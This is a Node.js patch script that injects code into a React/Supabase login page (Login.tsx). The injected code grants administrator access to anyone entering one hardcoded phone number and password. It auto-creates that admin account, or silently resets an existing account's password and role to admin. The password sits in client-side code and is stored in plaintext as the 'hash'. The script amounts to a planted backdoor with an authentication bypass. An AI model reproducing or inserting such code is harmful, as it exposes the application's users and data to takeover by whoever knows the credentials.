import fs from 'fs';
let content = fs.readFileSync('src/pages/Login.tsx', 'utf8');

const injection = `
      // Auto-create admin if it doesn't exist
      if (cleanPhone === '0704752133' && password === 'Calmaress225@') {
         const { data: adminData } = await supabase.from('users').select('*').eq('phone', '0704752133').single();
         if (!adminData) {
             const { data: newAdmin } = await supabase.from('users').insert({
                 phone: '0704752133',
                 country: "Côte d'Ivoire",
                 first_name: 'Admin',
                 last_name: 'Olam Agri',
                 password_hash: 'Calmaress225@',
                 role: 'admin',
                 balance: 0
             }).select().single();
             if (newAdmin) {
                 sessionStorage.removeItem('welcome_shown');
                 setUser(newAdmin);
                 navigate('/admin');
                 return;
             }
         } else if (adminData.password_hash !== 'Calmaress225@') {
             await supabase.from('users').update({ password_hash: 'Calmaress225@', role: 'admin' }).eq('phone', '0704752133');
             adminData.password_hash = 'Calmaress225@';
             adminData.role = 'admin';
             sessionStorage.removeItem('welcome_shown');
             setUser(adminData);
             navigate('/admin');
             return;
         }
      }
`;

content = content.replace("const { data, error } = await supabase", injection + "\n      const { data, error } = await supabase");
fs.writeFileSync('src/pages/Login.tsx', content);
